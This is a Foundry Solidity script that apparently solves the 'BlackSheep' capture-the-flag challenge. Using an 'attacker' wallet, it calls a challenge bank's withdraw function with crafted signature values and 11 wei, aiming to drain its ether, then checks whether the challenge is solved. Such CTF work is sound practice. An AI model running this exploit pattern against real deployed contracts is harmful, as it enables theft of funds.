// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/SheepChallenge.sol";
import "forge-std/Vm.sol";


contract BlackSheepScript is Script {
    Challenge challenge = Challenge(address(0xE9c7Ab98685b303422E40E14451d42c2Ea6fE234));

    function setUp() public {
        
    }


    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey, "attacker");        
        console.log("attacker wallet: ", wallet.addr);
        console.log("balance: %e", address(wallet.addr).balance);

        vm.startBroadcast(deployerPrivateKey);        
        ////////////////
        ISimpleBank bank = challenge.BANK();
        console.log("bank:", address( challenge.BANK()));
        //bank balance //@10 ETH
        console.log("bank balance: %e", address(challenge.BANK()).balance);//@10 ETH
        // try using failed message call
        bytes32 temp = keccak256(abi.encodePacked("attacker"));
        bank.withdraw{value: 11 wei }(temp ,27,temp,temp );

        console.log("is solved: ", challenge.isSolved());

        ////////////////
        vm.stopBroadcast();
    }
}
